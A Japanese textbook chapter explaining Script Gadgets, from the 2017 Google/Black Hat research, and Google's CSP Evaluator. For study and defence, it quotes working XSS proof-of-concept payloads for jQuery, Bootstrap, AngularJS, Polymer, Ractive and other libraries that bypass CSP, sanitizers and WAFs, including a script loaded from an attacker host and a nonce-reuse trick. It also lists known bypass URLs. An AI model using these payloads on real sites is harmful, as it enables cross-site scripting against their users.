## Script Gadgets（CSP Evaluator / Black Hat論文）

これまでの章では、CSP（Content Security Policy）を「攻撃者が任意のスクリプトを注入しても実行させない仕組み」として学んできた。しかし現実のWebアプリケーションには、jQuery や AngularJS、Bootstrap、Vue、あるいは自社のフロントエンドコードなど、大量の**信頼された（allowlistに載っている、あるいはページに元から存在する）JavaScriptライブラリ**が動いている。

**Script Gadgets（スクリプトガジェット）** とは、ページ上に**既に存在する正規のJavaScriptコード**でありながら、**攻撃者が制御できるDOM要素（タグ・属性・クラス名・`data-*`属性など）を読み取り、その内容に基づいてスクリプトを実行してしまう副作用を持つコード片**のことを指す。攻撃者は、CSPやサニタイザ、XSSフィルタ、WAF（Web Application Firewall）を通過できる「無害に見えるHTMLタグ・属性」だけを注入し、ページ上に既に存在するgadget（正規コード）にそれを「解釈」させることで、間接的にスクリプトを実行させる。つまり、**攻撃者は`<script>`を注入する必要がない**。ページ側のライブラリが、注入されたマークアップを見て「これはUIコンポーネントの初期化指示だ」と誤解し、自らJavaScriptを実行してしまうのである。

原典の言葉を借りれば、Script Gadgetの定義はこうだ。

> Script Gadget is an *existing* JS code on the page that may be used to bypass mitigations.
> （Script Gadgetとは、緩和策をバイパスするために利用しうる、ページ上に*既に存在する*JSコードである。）
>
> Script Gadgets convert otherwise safe HTML tags and attributes into arbitrary JavaScript code execution.
> （Script Gadgetは、それ自体は安全なHTMLタグや属性を、任意のJavaScriptコード実行へと変換する。）

この節では、この技法を体系化した研究（Black Hat USA 2017 発表、同年 ACM CCS 2017 採録）と、CSPポリシーの弱点を機械的に検出するGoogleのツール「CSP Evaluator」を扱う。両者は表裏一体の関係にある。Script Gadgets研究は「ホスト許可リスト方式のCSPは、そのホストに置かれたライブラリのgadget次第でバイパスされる」という脅威モデルを実証で確立し、CSP Evaluatorは「このホストを許可すると、そこにScript Gadgetsが存在するかもしれない」という観点でポリシーを機械的に評価するツールだからである。

> ⚠️ 本節では、原典スライド（Black Hat USA 2017 の PDF）から実際に抽出したペイロードと数値、および CSP Evaluator のソースコード（`github.com/google/csp-evaluator`）から抽出した実際の検査項目・重大度・許可リストバイパス一覧を用いている。本書の方針として、公開ラボの「解答」や攻撃対象を特定した攻略手順は書かない。以下のコード例は、原典が防御研究として公開した概念実証（PoC）の引用であり、仕組みの理解を目的とする。

---

### 1. なぜCSPだけでは不十分なのか（背景となる原理）

#### 1.1 「修正」と「緩和」の違い

原典スライドは、まずXSSの「修正（fixing）」と「緩和（mitigating）」を峻別することから始める。

- **修正（fix）**: XSSを根本から断つ。正しいやり方は「文脈を理解し、デフォルトで安全に自動エスケープするテンプレートシステム」を使うこと（Christoph Kern 2014, Jad Boutros 2009 を引用）。ただし既存アプリの移行には多大な労力がかかることも多い。
- **緩和（mitigation）**: 「修正は大変だから、代わりに攻撃を難しくしよう」というアプローチ。原典はこれを皮肉を込めて "The mitigator alligator circa 2016"（2016年頃の緩和ワニ）と呼ぶ。

決定的な指摘は次の一文である。

> Mitigations do not fix the vulnerability. They try to make the attacks harder instead. The XSS is still there, it's just presumably harder to exploit it.
> （緩和策は脆弱性を修正しない。攻撃を難しくしようとするだけだ。XSSはそこに残ったままで、ただ悪用が「おそらく難しくなった」に過ぎない。）

Script Gadgets研究の核心は、この「おそらく難しくなった」という前提を、**16の主要ライブラリに対して実測で崩した**ことにある。

#### 1.2 各緩和策の「見ているもの」

原典は、当時の主要な緩和策が「何を見て危険を判定しているか」を整理する。ここが決定的に重要である。

- **WAF / XSSフィルタ（ModSecurity CRS、旧Chrome/IE/EdgeのXSS Auditor、NoScript）**: リクエストやレスポンスに含まれる**危険なタグ・属性**（`<script>`、`<XSS>`など）をパターンでブロックする。`<p width=5>` や `<b><i>` のような一見無害なマークアップは通す。
- **HTMLサニタイザ（DOMPurify、Google Closure sanitizer）**: HTMLから**危険なタグ・属性を除去**する。許可リストにある安全そうな要素・属性（`title`、`data-*`、`id`、`class` など）は残す。
- **CSP**: 「正規のJSコードと注入されたJSコードを区別」しようとする。手段は3つ――(1) 正規の**送信元（オリジン）を許可リスト化**する、(2) コードの**ハッシュ**を許可リスト化する、(3) 使い捨ての**nonce（秘密のトークン）**を要求する。

これらに共通する致命的な前提が、次の一文に凝縮されている。

> XSS mitigations work by blocking attacks. Focus is on potentially malicious tags / attributes. **Most tags and attributes are considered benign.**
> （XSS緩和策は攻撃をブロックすることで働く。焦点は「悪意のありうるタグ・属性」に当てられる。**大半のタグ・属性は無害と見なされる。**）

Script Gadgetは、まさにこの「無害と見なされたタグ・属性」を、ページ上の正規コードにJavaScript実行へと変換させる。CSPの`script-src`は「スクリプトがどこから来たか」しか判定せず、「ページに元からある正規のJSがDOM上の何を読んで何をするか」までは一切関知しない。この**構文（タグ・属性・URLスキーム）と意味（そのタグ・属性がどのライブラリにどう解釈されるか）のギャップ**こそ、Script Gadgetsが成立する根本原理である。

#### 1.3 ROPとのアナロジー

この構造は、バイナリエクスプロイトにおける **ROP（Return-Oriented Programming、既存の実行可能コード断片＝gadgetをつなぎ合わせて任意処理を組み立てる手法）** に対応する。CCS 2017版の論文タイトルが "**Code-Reuse Attacks for the Web**"（Webのためのコード再利用攻撃）であるのはこのためだ。ROPが「バイナリ中の既存の命令列を再利用する」のに対し、Script Gadgetsは「**ページ中の既存のJavaScriptロジックを再利用する**」。攻撃者は新しいコードを持ち込まず、ページに元からある部品を組み合わせて目的を達成する。

> 出典: Breaking XSS mitigations via Script Gadgets（Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela Nava — Google, Black Hat USA 2017）— https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 2. Black Hat論文の全体像と数値

#### 2.1 冒頭の結論

発表者は Sebastian Lekies（@slekies）、Krzysztof Kotowicz（@kkotowicz）、Eduardo Vela Nava（@sirdarckcat）の3名（いずれもGoogle）。スライド冒頭は挑発的な宣言で始まる。

> We will show you how we bypassed **every** XSS mitigation we tested.
> （私たちがテストした**あらゆる**XSS緩和策を、どうバイパスしたかをお見せする。）

そして「16の人気ライブラリにおける、script gadgetチェーンによる緩和策バイパス可能性」を、次の集計で提示する（分母16は調査対象ライブラリ数、分子はバイパスを達成したライブラリ数）。

| 緩和策のカテゴリ | 具体策 | バイパス達成 |
|---|---|---|
| CSP | whitelist（ホスト許可リスト） | 3 / 16 |
| CSP | nonces（nonce方式） | 4 / 16 |
| CSP | unsafe-eval を許可した場合 | 10 / 16 |
| CSP | strict-dynamic | 13 / 16 |
| XSSフィルタ | Chrome XSS Auditor | 13 / 16 |
| XSSフィルタ | Edge | 9 / 16 |
| XSSフィルタ | NoScript | 9 / 16 |
| サニタイザ | DOMPurify | 9 / 16 |
| サニタイザ | Google Closure | 6 / 16 |
| WAF | ModSecurity CRS | 9 / 16 |

この表から読み取れる最重要の教訓は、**「厳格なはずのCSPほど、gadgetの選択肢が広がる場面がある」**という逆説である。`unsafe-eval` を許可すると10/16、`strict-dynamic` に至っては13/16でバイパスが成立した。理由は後述するが、要は「eval系のgadgetを呼べる」「動的に挿入した`<script>`が信頼される」という強い実行能力を、正規ライブラリが提供してしまうからである。

#### 2.2 影響範囲（なぜ気にすべきか）

原典は3つの数字で「これは他人事ではない」と示す。

> - Gadgets are prevalent in **all but one** of the tested popular web frameworks.（テストした人気フレームワークのうち、1つを除く**すべて**にgadgetが蔓延している。）
> - Gadgets are confirmed to exist in **at least 20%** of web applications from Alexa top 5,000.（Alexa上位5,000サイトのうち、**少なくとも20%**にgadgetが存在することを確認した。）
> - Gadgets can be used to bypass **most** mitigations in modern web applications.（現代のWebアプリの**大半**の緩和策をバイパスできる。）

「1つを除くすべて」の「1つ」とは React である（後述のサマリで「React — no gadgets」と明記される）。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 3. 具体的なgadgetの実例（原典PoCの引用）

ここからは、原典スライドに掲載された**実物のペイロード**を種類別に見ていく。各例で「攻撃者が注入するのは無害なマークアップだけ」「ページ上の正規コードがそれをコード実行に変換する」という共通構造を確認してほしい。

#### 3.1 導入例：架空の「ボタン」ライブラリ

最初にスライドが挙げる教育用の例。ある正規コードが `data-role=button` を持つ要素を探し、その `data-text` 属性値を `.html()`（＝`innerHTML`）で描画するとする。

```html
<div data-role="button" data-text="I am a button"></div>
```
```js
var buttons = $("[data-role=button]");
buttons.html(button.getAttribute("data-text"));   // ← これがScript Gadget
```

正常時は `data-text` の中身がそのままボタン文字列になる。しかし攻撃者が `data-text` にHTMLエンティティ化した`<script>`を仕込むと――

```html
<div data-role="button" data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
```

`getAttribute("data-text")` は属性値をデコードした文字列 `<script>alert(1)</script>` を返し、それが `.html()` に渡って **`<script>` としてDOMに実体化**する。

- **なぜ動くか**: サニタイザは注入されたHTMLの「見た目」しか見ていない。属性値の中の `&lt;script&gt;` はただのテキストであり、`title` や `data-text` のような属性は「安全」として許可される。しかし正規コードが後から `getAttribute` でその値を取り出し、HTMLとして**再パース（パーサ再解釈）**して危険なsink（`innerHTML`）に渡す。この「一度は無害なテキストとして通過したデータが、後段の正規コードで危険な文脈に置き直される」という時間差・経路分離が、静的フィルタの検出網をすり抜ける。

#### 3.2 Knockout：属性値を `eval()` する

Knockout の `data-bind` 属性は、内部で次のように処理される（スライドから抜粋・簡略化）。

```js
switch (node.nodeType) {
  case 1: return node.getAttribute("data-bind");
}
// ...
var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
    functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
return new Function("$context", "$element", functionBody);
```

`data-bind` の値がそのまま `new Function(...)` の本体に埋め込まれる。つまり実質的に `data-bind="value: foo"` は `eval("foo")` に等しい。Knockout製アプリをXSSするには、攻撃者はこれだけ注入すればよい。

```html
<div data-bind="value: alert(1)"></div>
```

- **なぜ動くか**: `data-bind` は「UIとデータの紐付け設定」を書く属性であり、サニタイザにとっては無害な`data-*`属性の一種にすぎない。だがKnockoutはその文字列を JavaScript 式として `new Function` でコンパイル・実行する。`<script>` タグも `onerror` も使っていないのに、コード実行に到達する。

#### 3.3 Ajaxify：`<div>` を `<script>` に変換

Ajaxify は `class="document-script"` を持つすべての `<div>` を `<script>` 要素へ変換する。

```html
<div class="document-script">alert(1)</div>
```

> And Ajaxify will do the job for you.（あとはAjaxifyが仕事をしてくれる。）

- **なぜ動くか**: `class` も `<div>` も「無害」の典型。しかしライブラリ側が「このクラスの div は実はスクリプトだ」という独自の規約を持っているため、無害な要素が実行可能スクリプトに昇格する。

#### 3.4 Bootstrap：最もシンプルなgadget（属性値を`innerHTML`へ）

原典が "the simplest gadget"（最もシンプルなgadget）と呼ぶ例。Bootstrap の tooltip は `data-html=true` のとき、`title` 属性の値を `innerHTML` として挿入する。

```html
<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'>
```

> HTML sanitizers allow the title attribute, because it's usually safe. But they aren't, when used together with Bootstrap and other data-attributes.
> （サニタイザは `title` 属性を許可する。通常は安全だからだ。だがBootstrapや他のdata属性と組み合わさると、そうではなくなる。）

- **なぜ動くか**: `title` はツールチップ文言に使う「安全な」属性としてサニタイザの許可リストにほぼ必ず入っている。Bootstrapは `data-html=true` の指示に従い、その安全なはずの `title` を `innerHTML` に流し込む。属性単体の安全性と、ライブラリと組み合わせた際の危険性が乖離する好例。

#### 3.5 Google Closure：DOM Clobberingでスクリプト元を乗っ取る

Closure は「自分自身のスクリプトURL」を検出し、同じ場所からサブリソースを読み込む。攻撃者は特定の `id` を持つ要素を注入して、その基準パスを混乱させられる。

```html
<a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//></a>
<form id=CLOSURE_UNCOMPILED_DEFINES>
<input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING></form>
```

- **なぜ動くか**: これは**DOM Clobbering**（別節で詳述）の応用。`id`（や `name`）を持つDOM要素は、`window` や `document` のプロパティとしてJavaScriptから参照可能になる。攻撃者が `id=CLOSURE_BASE_PATH` の要素を置くと、Closureが参照する変数 `CLOSURE_BASE_PATH` がそのDOM要素で「上書き（clobber）」され、`href` の `data:` URI をスクリプトの読み込み元だと誤認する。無害な `<a>`/`<form>`/`<input>` だけで、スクリプトの出所そのものを乗っ取る。この gadget は NoScript のバイパスにも使われた。

#### 3.6 RequireJS：`data-main` で任意モジュールを読ませる

```html
<script data-main='data:1,alert(1)' src='require.js'></script>
```

> RequireJS allows the user to specify the "main" module of a JavaScript file, and it is done through a custom data attribute, of which XSS filters and other mitigations aren't aware of.
> （RequireJSは「main」モジュールをカスタムdata属性で指定できるが、XSSフィルタや他の緩和策はその属性を知らない。）

- **なぜ動くか**: `data-main` は RequireJS 独自の慣習であり、フィルタの危険パターン集に載っていない。RequireJS はその値を「読み込むべきモジュール」として `data:` URI ごと実行する。

#### 3.7 Ember：strict-dynamic の突破

Emberの開発版は、いったん無効なself-closingスクリプトタグから**有効なコピーを作り直して再挿入**する。strict-dynamic CSPは「動的に挿入された`<script>`」を信頼するため、これがバイパスになる。

```html
<script type=text/x-handlebars>
  <script src=//attacker.example.com// />
</script>
```

- **なぜ動くか**: strict-dynamicの信頼モデルは「すでに信頼されたスクリプトが**動的に生成**したスクリプトも信頼する（信頼の伝播）」というもの。Emberが元スクリプトを再構築して `appendChild` 等で挿入する行為は、CSPから見れば「信頼されたコードによる動的挿入」に該当してしまう。攻撃者が静的に置いた `<script>` はブロックされるが、Emberが再挿入したコピーは信頼されて実行される。なお、これは**開発版でのみ**成立する（サマリで "gadgets only in development version" と注記）。

#### 3.8 jQuery：`<form>`+`<input>` でスクリプトを再挿入させる

jQueryは、既存の`<script>`タグを取り出して再挿入するgadgetを持つ。攻撃者は `<form>` と `<input name="ownerDocument">` を注入して、jQueryのロジックを混乱させる。

```html
<form class="child">
<input name="ownerDocument"/><script>alert(1);</script></form>
```

> Strict-dynamic CSP blocks the `<script>`, but then jQuery reinserts it. Now it's trusted and will execute.
> （strict-dynamic CSPは`<script>`をブロックするが、jQueryがそれを再挿入する。すると信頼され、実行される。）

- **なぜ動くか**: 3.7 と同じ「動的挿入は信頼される」原理。`input[name=ownerDocument]` は、jQuery内部で `elem.ownerDocument` を参照する処理を**DOM Clobbering**で乗っ取り、正常なドキュメント判定を狂わせるための仕込みである。

#### 3.9 jQuery Mobile：HTMLコメントを閉じてサニタイザを破る

jQuery Mobile は、要素の `id` 属性値を動的にHTMLコメント内へ埋め込む箇所がある。攻撃者はコメントを閉じるだけで任意コード実行できる。

```html
<div data-role=popup id='--><script>"use strict"
alert(1)</script>'></div>
```

- **なぜ動くか**: `id` 属性は「安全」としてサニタイザを通過する。しかしライブラリがその値を `<!-- ... -->` の内側に文字列連結で差し込むため、値の先頭に `-->` を置けばコメントを早期終了させ、続く `<script>` を実コードとして注入できる。これはサニタイザ（DOMPurifyなど）のバイパスとして機能する。

#### 3.10 Dojo Toolkit：ModSecurity CRS の突破

```html
<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">
```

- **なぜ動くか**: Dojoは `data-dojo-type`/`data-dojo-props` を宣言的なウィジェット定義として解釈・評価する。`data-*` 属性で構成されているため、ModSecurity CRS（正規表現ベースのWAF）の危険パターンに一致しない。

#### 3.11 Underscore テンプレート：unsafe-eval の突破

```html
<div type=underscore/template> <% alert(1) %> </div>
```

- **なぜ動くか**: Underscoreのテンプレートは `<% %>` の中身を JavaScript として `eval` 相当で実行する。CSPが `unsafe-eval` を許可している環境でのみ成立する（gadgetが `eval` を呼ぶため）。

#### 3.12 式パーサ系gadget：Aurelia / AngularJS / Polymer / Ractive / Vue

最も強力なカテゴリ。これらのフレームワークは **eval を使わず、独自の式パーサ**を持つ。式をトークン化・パース・評価し、JavaScriptに「コンパイル」して実行する。原典の要点はこうだ。

> With sufficiently complex expression language, we can run arbitrary JS code.
> （十分に複雑な式言語があれば、私たちは任意のJSコードを実行できる。）

この「自前の式評価器」があるおかげで、CSPが `unsafe-eval` を禁止していても、**ホスト許可リスト方式でも、nonce方式でも**バイパスが成立しうる。フレームワーク自身がインタプリタを内蔵しているからだ。実物のPoCを見る。

**Aurelia**（新しい`<script>`要素を挿入するプログラムを式言語で記述）:

```html
<div ref="me"
s.bind="$this.me.ownerDocument.createElement('script')"
data-bar="${$this.me.s.src='data:,alert(1)'}"
data-foobar="${$this.me.ownerDocument.body.appendChild($this.me.s)}"></div>
```

**Polymer 1.x**（"private" な `_properties` を上書きしてフレームワークを混乱させる。ヒント：下から上へ読む）:

```html
<template is=dom-bind><div
 five={{insert(me._nodes.0.scriptprop)}}
 four="{{set('insert',me.root.ownerDocument.body.appendChild)}}"
 three="{{set('me',nextSibling.previousSibling)}}"
 two={{set('_nodes.0.scriptprop.src','data:\,alert(1)')}}
 scriptprop={{_factory()}}
 one={{set('_factoryArgs.0','script')}} >
</template>
```

**Polymer 1.x で whitelist / nonce CSP を突破**:

```html
<template is=dom-bind><div
      c={{alert('1',ownerDocument.defaultView)}}
      b={{set('_rootDataHost',ownerDocument.defaultView)}}>
</div></template>
```

**AngularJS 1.6+ で whitelist / nonce CSP を突破**:

```html
<div ng-app ng-csp ng-focus="x=$event.view.window;x.alert(1)">
```

- **なぜ動くか（式パーサ全般）**: これらは `<script>`・`eval`・`javascript:` を一切使わない。フレームワークの**式評価エンジンそのもの**を借用して、`ownerDocument.createElement('script')` や `appendChild`、`$event.view.window.alert` といったDOM/ネイティブAPIをつなぎ、任意処理を組み立てる。CSPは「送信元」も「evalの有無」も見ているが、フレームワーク内蔵インタプリタによる評価は、CSPの監視対象の外にある。`ng-csp` は AngularJS を「CSP互換モード」（`Function`コンストラクタを使わないモード）で動かす属性で、これを付けることで unsafe-eval なしでも AngularJS の式評価が働く点が鍵。

**Ractive で nonce の窃取・再利用**（極めつけ）:

```html
<script id="template" type="text/ractive">
  <iframe srcdoc="
      <script nonce={{@global.document.currentScript.nonce}}>
        alert(1337)
      </{{}}script>">
  </iframe>
</script>
```

- **なぜ動くか**: nonce方式CSPは「サーバが発行した秘密のnonceを持つ`<script>`だけ実行する」。攻撃者はnonceを知らないはずだが、Ractiveの式言語で `document.currentScript.nonce` を読み出し、それを `srcdoc` で生成する子フレーム内の `<script nonce=...>` に**再利用**する。`</{{}}script>` は、式展開で空文字を挟むことでパーサの `</script>` 検出を避けるトリック。これはnonceを「秘密」たらしめる前提を、gadget経由で崩している。

#### 3.13 gadgetのまとめ（16ライブラリ）

調査対象の16ライブラリ:

> AngularJS 1.x, Aurelia, Bootstrap, Closure, Dojo Toolkit, Emberjs, Knockout, Polymer 1.x, Ractive, React, RequireJS, Underscore / Backbone, Vue.js, jQuery, jQuery Mobile, jQuery UI

結論:

> - It turned out they are prevalent（gadgetは蔓延していた）
> - **Only one library did not have a useful gadget**（有用なgadgetを持たなかったのは1つだけ＝React）
> - XSSes in Aurelia, AngularJS (1.x), Polymer (1.x) can bypass **all** mitigations via expression parsers.（Aurelia・AngularJS 1.x・Polymer 1.x のXSSは、式パーサ経由で**すべての**緩和策をバイパスできる。）
> - EmberJS — gadgets only in development version（Emberのgadgetは開発版のみ）

そして手法の集計（framework/mitigation の組合せ）:

> Bypasses in **53.13%** of the framework/mitigation pairs.
> （フレームワーク×緩和策の組合せの **53.13%** でバイパスが成立した。）

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 4. 大規模実測：Alexa上位5,000サイトの実態

論文の後半（Samuel Groß, Martin Johns との共同研究）は、gadgetが**実運用サイトのユーザーランドコード**にも普遍的に存在することを、大規模クロールで示す。

#### 4.1 手法

> We used **taint tracking** to detect data flows from the DOM into sinks. Each data flow represents a potential gadget.
> （テイント追跡で、DOMからsinkへのデータフローを検出した。各データフローは潜在的なgadgetを表す。）

テイント追跡（taint tracking）とは、「攻撃者が制御しうる入力（DOM属性など＝source）」に印（テイント）を付け、それが危険な処理（`innerHTML`・`eval`・`createElement('script')` など＝sink）に到達するかを実行時に追跡する手法。到達した各経路が「gadget候補」になる。イメージはこうだ。

```js
elem.innerHTML = $('#mydiv').attr('data-text');   // data-text(source) → innerHTML(sink)
```
```html
<div id="mydiv" data-text="<script>xssgadget()</script>">
```

クロール対象:

> - Alexa Top 5,000 サイトを1階層深く（one level deep）、同一セカンドレベルドメイン内の全リンクをたどってクロール。

#### 4.2 クロール規模

> - 4,557 の second-level ドメイン、37,232 のサブドメイン、**647,085** 個の個別Webページ

#### 4.3 テイントされたデータフロー

> - **82%** のサイトが、少なくとも1つの関連データフローを持っていた。
> - 1URLあたり平均 **6.72** 回のsink呼び出し、セカンドレベルドメインあたり **450** 回。
> - 総計 **4,352,491** 回のsink呼び出し、**22,379** 個のユニークなgadget候補（ドメイン・sink・sourceの組合せ）。

#### 4.4 緩和策別の潜在gadget

**CSP関連:**
> - **48%** のドメインが、潜在的な `eval` gadget を持つ（＝CSP unsafe-eval が有効なら悪用されうる）。
> - **73%** のドメインが、潜在的な strict-dynamic gadget を持つ（`script.text`/`src` へのフロー、jQueryの`.html()`、`createElement(tainted).text` など）。

**HTMLサニタイザ関連:**
> - **78%** のドメインが、HTML属性からの少なくとも1つのデータフローを持つ。
> - **60%** が `data-*` 属性からのフロー、**16%** が `id` 属性から、**10%** が `class` 属性から。

#### 4.5 実証済みgadget

> - **1,762,823** 個のgadgetベース攻撃候補を生成。
> - そのうち **285,894** 個のgadgetを、**906ドメイン（19.88%）** で実際に有効と検証した。
> - この数字は**下限**であり、実際の数はもっと多いと考えられる。

つまり、「Alexa上位5,000サイトの約20%は、gadget経由で実際にXSS緩和策をバイパスできる状態にあった」ことが、生成・検証の両方で裏付けられた。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 5. 防御・展望（原典の結論）

原典は「gadgetを潰す」アプローチの限界を率直に述べる。

**緩和策に「gadget対応」を足すのは困難:**
> - ライブラリと式言語が多数存在する。
> - 誤検知（false positive）が避けられない。

**フレームワーク側でgadgetを潰すのも問題:**
> - ライブラリが多すぎる。
> - gadgetはXSS本体より発見が難しいことがある。
> - 開発者は反発する――「これはバグじゃない（XSSこそがバグだ）」。
> - gadgetが**機能そのもの**であることもある（例：式言語）。

**本質的な結論:**
> - A novice programmer, today, cannot write a complex but secure application. The task is getting harder, not easier.（今日、初級プログラマが複雑かつ安全なアプリを書くことはできない。この作業は易しくなるどころか難しくなっている。）
> - We need to make the platform **secure-by-default**（プラットフォームを**デフォルトで安全**にする必要がある）:
>   - 安全なDOM API（Safe DOM APIs）
>   - ブラウザのより良いプリミティブ
>   - ビルド時セキュリティ（例：プリコンパイル済みテンプレート＝Angular 2 の AOT）
> - より良い分離プリミティブ（Suborigins, `<iframe sandbox>`, Isolated scripts）が必要。

この「secure-by-default」への転換の思想は、後年の **Trusted Types**（DOM XSSのsinkを型で縛る仕組み、別節で詳述）や、React/Angular 2+ のような「自動エスケープ・プリコンパイルテンプレート」を持つフレームワークの普及として結実していく。React が唯一 gadget を持たなかったのは偶然ではなく、`dangerouslySetInnerHTML` を明示的に呼ばない限り文字列がHTMLとして解釈されない「デフォルト安全」設計の帰結である。

> 出典: Breaking XSS mitigations via Script Gadgets — https://blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf

---

### 6. Google CSP Evaluator

#### 6.1 ツールの位置づけ

**CSP Evaluator**（https://csp-evaluator.withgoogle.com/、コアライブラリは npm の `csp_evaluator`、ソースは `github.com/google/csp-evaluator`）は、CSPポリシー文字列を貼り付けると、そのポリシーに含まれる**構文的・意味的な弱点**を自動検出し、重大度付きで一覧表示するツール兼ライブラリである。READMEはこう述べる。

> CSP Evaluator ... helps identify subtle CSP bypasses which undermine the value of a policy. CSP Evaluator checks are based on a **large-scale study**.（CSP Evaluatorは、ポリシーの価値を損なう巧妙なCSPバイパスの特定を助ける。検査は**大規模研究**に基づく。）

この「large-scale study」こそ、第4〜5節で見た Script Gadgets の実測研究（および同グループの CSP 導入実態調査 pub45542）である。CSP Evaluator と Script Gadgets 研究が表裏一体、というのはこの意味だ。CSP Evaluator は「gadgetを持つと知られたホストを許可リストに入れていないか」を機械的にチェックする。

- CSPバージョン選択: v3（nonceベース＋後方互換チェック）／v3／v2／v1 の4モード。nonceは v2 以降でのみ有効で、「CSP v1 しかサポートしないブラウザは nonce を無視する」ため、想定するブラウザに応じて評価が変わる。
- Chrome拡張としても提供される。
- 免責: "Google provides no guarantees or warranties for this tool."（公式製品ではない。）

#### 6.2 重大度（Severity）の定義

`finding.ts` の `Severity` enum（数値が小さいほど深刻）:

```
HIGH = 10          // 高（実際にバイパス可能）
SYNTAX = 20        // 構文エラー
MEDIUM = 30        // 中
HIGH_MAYBE = 40    // 高の可能性
STRICT_CSP = 45    // Strict CSPへの改善提案
MEDIUM_MAYBE = 50  // 中の可能性
INFO = 60          // 情報
NONE = 100         // 問題なし
```

#### 6.3 実装されている主な検査項目（ソースからの実物）

以下は `checks/security_checks.ts` と `checks/strictcsp_checks.ts` に実装された検査関数と、**実際の警告メッセージ・重大度**である。原理を添えて読む。

**(1) unsafe-inline（`checkScriptUnsafeInline`）— HIGH**
> "'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers."

`unsafe-inline` はページ上のあらゆるインラインスクリプト・イベントハンドラを許可する。攻撃者が注入したものも区別なく通るため、素朴なXSSすら防げなくなる。CSPの送信元チェック機構そのものを無効化するキーワードなので最高重大度。（`unsafe-hashes` は MEDIUM_MAYBE。）

**(2) unsafe-eval（`checkScriptUnsafeEval`）— MEDIUM_MAYBE**
> "'unsafe-eval' allows the execution of code injected into DOM APIs such as eval()."

`eval()`・`setTimeout("string")`・`new Function(...)` 等の文字列→コード変換を許可する。第3節の Underscore テンプレートや Knockout のような eval系gadget を成立させる前提となる。

**(3) plain URLスキーム（`checkPlainUrlSchemes`）— HIGH**
> "[scheme] URI in [directive] allows the execution of unsafe scripts."

`data:`・`http:` などのスキームを `script-src` に許可すると、`data:` URI で任意スクリプトを持ち込めてしまう（第3節の RequireJS/Aurelia が使った `data:,alert(1)` を想起）。

**(4) ワイルドカード（`checkWildcards`）— HIGH**
> "[directive] should not allow '*' as source"

`*` は事実上あらゆるオリジンを許可し、CSPの意味を消す。

**(5) object-src欠落（`checkMissingObjectSrcDirective`）— HIGH**
> "Missing object-src allows the injection of plugins which can execute JavaScript..."

`<object>`/`<embed>` 経由のコード実行を防ぐため `object-src 'none'` を要求する。

**(6) script-src欠落（`checkMissingScriptSrcDirective`）— HIGH**
> "script-src directive is missing."

`script-src` が無ければスクリプト実行が無制限。

**(7) base-uri欠落（`checkMissingBaseUriDirective`）— HIGH**
> "Missing base-uri allows the injection of base tags. They can be used to set the base URL..."

`base-uri` 未設定だと、攻撃者が `<base href="https://attacker.example/">` を注入して、ページ内の相対パス指定スクリプト（`<script src="/app.js">` 等）の読み込み元を攻撃者サーバへすり替えられる。ブラウザは相対URLを `document.baseURI`（`<base>`で変更可能）基準で解決するため、`script-src 'self'` の「self」の解釈基準そのものが乗っ取られる。`base-uri 'none'` または `'self'` を強く推奨。

**(8) script許可リストバイパス（`checkScriptAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
> - "'self' can be problematic if you host JSONP, AngularJS or user uploaded files." （MEDIUM_MAYBE）
> - "[domain] is known to host [endpoints] which allow to bypass this CSP." （HIGH）
> - "No bypass found; make sure that this URL doesn't serve JSONP replies or Angular libraries." （MEDIUM_MAYBE）

これが Script Gadgets 研究と直結する検査。許可したドメインが、**既知のJSONPエンドポイント**（`jsonp.ts`）や **AngularJS配信URL**（`angular.ts`）を含む場合、名指しで HIGH 警告を出す。原理は「オリジン単位の許可は、そのオリジン上の安全なファイルと危険なファイル（JSONP・gadgetライブラリ）を区別できない」こと。

CSP Evaluator が同梱する既知バイパス一覧（抜粋、実物）:
- JSONP系（`jsonp.ts` の `URLS`）: `//www.google-analytics.com/gtm/js`、`//translate.googleapis.com/translate_a/l`、`//accounts.google.com/o/oauth2/revoke`、`//api.facebook.com/restserver.php`、`//syndication.twitter.com/widgets/timelines/...`、`//www.youtube.com/profile_style`、`//api.vk.com/method/wall.get` など多数。
- eval が必要なJSONP系（`NEEDS_EVAL`）: `googletagmanager.com`、`www.googleadservices.com`、`google-analytics.com` など。
- AngularJS配信（`angular.ts` の `URLS`）: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.0rc1/angular-route.min.js`、`//cdnjs.cloudflare.com/ajax/libs/angular.js/1.2.16/angular.min.js`、`//cdn.jsdelivr.net/angularjs/1.1.2/angular.min.js`、`//www.gstatic.com/fsn/angular_js-bundle1.js` など多数。
- Flash（`flash.ts` の `URLS`）: `//vk.com/swf/video.swf`、`//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf`。

ソースの注記どおり「This list only contains popular bypasses and is by no means complete.（人気のバイパスのみで、網羅的ではない）」――つまり載っていないから安全、とは言えない。

**(9) Flash object許可リストバイパス（`checkFlashObjectAllowlistBypass`）— HIGH / MEDIUM_MAYBE**
> - "[hostname] is known to host Flash files which allow to bypass this CSP." （HIGH）
> - "Can you restrict object-src to 'none' only?" （MEDIUM_MAYBE）

**(10) IPソース（`checkIpSource`）— INFO**
> - "[directive] directive allows localhost as source. ..."
